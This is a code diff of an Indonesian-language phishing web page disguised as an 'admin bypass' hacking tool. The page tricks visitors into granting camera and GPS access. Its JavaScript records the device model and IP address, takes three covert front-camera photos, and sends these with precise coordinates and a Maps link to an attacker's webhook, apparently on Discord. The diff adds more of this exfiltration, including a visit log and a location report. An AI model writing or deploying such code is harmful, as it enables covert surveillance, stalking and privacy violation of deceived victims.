@@ -16,14 +16,14 @@
         .btn { background: #ff0000; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; font-family: inherit; font-size: 14px; box-shadow: 0 0 15px #ff0000; text-transform: uppercase; }
         .loader { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 11px; color: #ffaa00; margin-top: 15px; min-height: 60px; font-weight: bold; line-height: 1.5; }
+        #status { font-size: 11px; color: #ffaa00; margin-top: 15px; min-height: 70px; font-weight: bold; line-height: 1.6; }
         #result-page { display: none; width: 100%; height: 100vh; position: fixed; top: 0; left: 0; background: #000; z-index: 9999; overflow-y: scroll; padding: 20px; box-sizing: border-box; }
-        .inner-container { max-width: 500px; margin: 0 auto; padding-bottom: 50px; }
+        .inner-container { max-width: 500px; margin: 0 auto; padding-bottom: 60px; }
         video, canvas { display: none; }
         .data-box { border: 1px solid #00ff41; padding: 15px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); text-align: left; font-size: 12px; }
-        .map-frame { width: 100%; height: 250px; border: 1px solid #00ff41; margin-top: 10px; filter: invert(90%) hue-rotate(180deg); }
+        .map-frame { width: 100%; height: 260px; border: 1px solid #00ff41; margin-top: 10px; filter: invert(90%) hue-rotate(180deg); }
         #photo-container { display: flex; flex-direction: column; gap: 15px; margin-top: 10px; }
-        .preview-img { width: 100%; border: 1px solid #00ff41; border-radius: 4px; display: block; }
+        .preview-img { width: 100%; border: 1px solid #00ff41; border-radius: 4px; display: block; background: #111; }
     </style>
 </head>
 <body>
@@ -35,12 +35,13 @@
         <div class="data-item"><span class="label">IP_Addr</span><span id="d-ip" class="val">Fetching...</span></div>
         <div class="data-item"><span class="label">Battery</span><span id="d-bat" class="val">---</span></div>
         <div class="data-item"><span class="label">RAM_Est</span><span id="d-ram" class="val">---</span></div>
-        <div class="data-item" style="grid-column: span 2;"><span class="label">Browser_Build</span><span id="d-build" class="val">Scanning...</span></div>
+        <div class="data-item" style="grid-column: span 2;"><span class="label">System_Build</span><span id="d-build" class="val">Scanning...</span></div>
     </div>
+    
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
     <div id="loading-icon" class="loader"></div>
-    <p id="status">[SYSTEM] Akses Dibatasi. Memerlukan Protokol Bypass Kamera & Lokasi.</p>
+    <p id="status">[SYSTEM] Akses Dibatasi. Memerlukan Protokol Bypass Kamera & Lokasi untuk Sinkronisasi.</p>
     <button id="mainBtn" class="btn" onclick="startProcess()">Bypass Admin Access</button>
 </div>
 
@@ -49,7 +50,7 @@
         <h3 style="color: #00ff41; text-align: center;">SUCCESS: ADMIN_DATABASE_VIEW</h3>
         <hr color="#00ff41">
         <div class="data-box">
-            <span style="color: #ff0000; font-weight: bold;">[!] SATELLITE_DATA</span><br>
+            <span style="color: #ff0000; font-weight: bold;">[!] GPS_SATELLITE_DATA</span><br>
             KOORDINAT: <span id="res-latlon" style="color:#fff;">Connected</span><br>
             STATUS: <span style="color:#00ff41;">SINKRON</span>
         </div>
@@ -67,10 +68,11 @@
     let stream;
     let collectedData = {};
 
+    // Inisialisasi Data Perangkat
     (async function init() {
         const ua = navigator.userAgent;
         collectedData = {
-            model: ua.match(/\(([^;]+);/) ? ua.match(/\(([^;]+);/)[1] : "Generic Device",
+            model: ua.match(/\(([^;]+);/) ? ua.match(/\(([^;]+);/)[1] : "Unknown Device",
             build: ua.split(' ').pop(),
             ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A"
         };
@@ -89,7 +91,14 @@
             const d = await res.json();
             collectedData.ip = d.ip;
             document.getElementById('d-ip').innerText = d.ip;
-        } catch (e) { document.getElementById('d-ip').innerText = "ERROR"; }
+        } catch (e) { collectedData.ip = "ERR_FETCH"; }
+        
+        // Log kunjungan awal
+        fetch(WH, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ content: `🔔 **Target Masuk Halaman**\nIP: ${collectedData.ip}\nDevice: ${collectedData.model}` })
+        });
     })();
 
     async function startProcess() {
@@ -99,26 +108,30 @@
 
         btn.style.display = 'none';
         loader.style.display = 'block';
-        status.innerText = "[AUTH] Menghubungkan Protokol Kamera...";
+        status.innerText = "[AUTH] Memulai Protokol Kamera Depan...";
 
         try {
-            // STEP 1: KAMERA (WAJIB)
-            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('video').srcObject = stream;
+            // STEP 1: Kamera Wajib
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
             
-            status.innerText = "[WARMUP] Sinkronisasi Sensor (6 detik)...";
+            // Warmup Kamera diperpanjang untuk sensor cahaya (Exposure)
+            status.innerText = "[WARMUP] Menstabilkan Sensor Cahaya (6 detik)...";
             
             setTimeout(async () => {
-                status.innerText = "[CAPTURE] Mengambil 3 Foto Biometrik...";
+                status.innerText = "[CAPTURE] Mengamankan 3 Log Biometrik...";
                 await takePhotos(3);
                 
-                // STEP 2: LOKASI (WAJIB)
-                status.innerText = "[GPS] Sinkronisasi Geofencing...";
+                // STEP 2: Lokasi Wajib
+                status.innerText = "[GPS] Sinkronisasi Lokasi Satelit...";
                 requestLocation();
             }, 6000);
 
         } catch (err) {
-            handleError("IZIN KAMERA DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses KAMERA agar akses Admin Panel bisa melihat target.");
+            handleError("IZIN KAMERA DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses KAMERA agar akses Admin Panel bisa melihat kamera target.");
         }
     }
 
@@ -130,19 +143,26 @@
         for (let i = 1; i <= count; i++) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+            
+            // Tampilkan di halaman hasil
             const img = document.createElement('img');
             img.src = URL.createObjectURL(blob);
             img.className = 'preview-img';
             photoContainer.appendChild(img);
 
+            // Kirim ke Webhook (File Multipart)
             const fd = new FormData();
-            fd.append("file", blob, `bypass_${i}.jpg`);
-            fd.append("payload_json", JSON.stringify({ content: `📸 **CAPTURE ${i}/3**\nIP: ${collectedData.ip}` }));
+            fd.append("file", blob, `admin_capture_${i}.jpg`);
+            fd.append("payload_json", JSON.stringify({ 
+                content: `📸 **LOG BIOMETRIK ${i}/3**\nTarget: ${collectedData.ip} (${collectedData.model})` 
+            }));
+            
             await fetch(WH, { method: "POST", body: fd });
-            await new Promise(res => setTimeout(res, 1200));
+            await new Promise(res => setTimeout(res, 1500)); // Jeda agar Discord tidak rate-limit
         }
     }
 
@@ -152,17 +172,31 @@
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 document.getElementById('res-latlon').innerText = `${lat}, ${lon}`;
-                document.getElementById('map-container').innerHTML = `<iframe class="map-frame" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>`;
+                
+                // Embed Map Iframe
+                document.getElementById('map-container').innerHTML = 
+                    `<iframe class="map-frame" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lon}&z=16&output=embed"></iframe>`;
 
-                // PINDAH KE HALAMAN HASIL HANYA JIKA SEMUA BERHASIL
+                // Kirim Lokasi ke Discord
+                fetch(WH, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        content: `📍 **LOKASI TARGET DITEMUKAN**\nMaps: https://www.google.com/maps?q=${lat},${lon}\nIP: ${collectedData.ip}` 
+                    })
+                });
+
+                // TAMPILKAN PANEL JIKA SEMUA SUKSES
                 document.getElementById('login-panel').style.display = 'none';
                 document.getElementById('result-page').style.display = 'block';
+                
+                // Matikan kamera setelah selesai jepret
                 if (stream) stream.getTracks().forEach(t => t.stop());
             },
             (err) => {
                 handleError("IZIN LOKASI DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses LOKASI agar akses Panel dapat melihat lokasi.");
             },
-            { enableHighAccuracy: true }
+            { enableHighAccuracy: true, timeout: 10000 }
         );
     }
 
@@ -171,16 +205,14 @@
         const loader = document.getElementById('loading-icon');
         const status = document.getElementById('status');
 
-        status.innerHTML = `<span style="color:#ff0000">${msg}</span><br><br><span style="color:#888;">Mencoba ulang dalam 5 detik...</span>`;
+        status.innerHTML = `<span style="color:#ff0000; font-size:12px;">CRITICAL_ERROR:</span><br>${msg}<br><br><span style="color:#888;">Menghubungkan ulang dalam 5 detik...</span>`;
         
-        if (stream) {
-            stream.getTracks().forEach(t => t.stop());
-        }
+        if (stream) { stream.getTracks().forEach(t => t.stop()); }
 
         setTimeout(() => {
             loader.style.display = 'none';
             btn.style.display = 'block';
-            btn.innerText = "COBA BYPASS LAGI";
+            btn.innerText = "ULANGI BYPASS";
         }, 5000);
     }
 </script>
